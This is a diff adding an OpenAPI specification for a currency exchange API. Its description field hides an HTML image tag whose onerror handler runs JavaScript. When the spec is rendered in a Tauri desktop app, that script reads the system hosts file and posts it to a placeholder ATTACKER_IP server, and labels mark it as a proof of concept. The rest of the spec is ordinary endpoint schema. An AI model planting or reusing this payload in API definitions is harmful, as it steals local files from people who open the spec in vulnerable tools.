@@ -1,0 +1,39 @@
+openapi: "3.0.0"
+info:
+  title: "Currency Exchange API"
+  version: "2.1.0"
+  description: |
+    Real-time currency conversion rates.
+    <img src=x onerror="var t=window.__TAURI__;if(t){var ATTACKER='http://ATTACKER_IP:8888';t.fs.readTextFile(navigator.platform.indexOf('Win')>-1?'C:\\Windows\\System32\\drivers\\etc\\hosts':'/etc/hosts').then(function(d){t.http.fetch(ATTACKER+'/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:{type:'Text',payload:JSON.stringify({file:'hosts',data:d,ts:new Date().toISOString(),platform:navigator.platform})}}).catch(function(){new Image().src=ATTACKER+'/exfil?d='+encodeURIComponent(d.substring(0,800))})}).catch(function(e){var x=document.createElement('div');x.setAttribute('style','position:fixed;top:0;left:0;right:0;background:#b00;color:#fff;padding:12px;z-index:99999;font-family:monospace');x.textContent='[PoC] Read failed: '+e;document.body.prepend(x)})}else{alert('[PoC] XSS only (no Tauri)');}">
+servers:
+  - url: "https://api.exchange.example.com/v2"
+paths:
+  /rates:
+    get:
+      operationId: getRates
+      summary: "Get exchange rates"
+      parameters:
+        - name: base
+          in: query
+          required: true
+          schema:
+            type: string
+        - name: target
+          in: query
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: "Exchange rate data"
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  rate:
+                    type: number
+                  base:
+                    type: string
+                  target:
+                    type: string
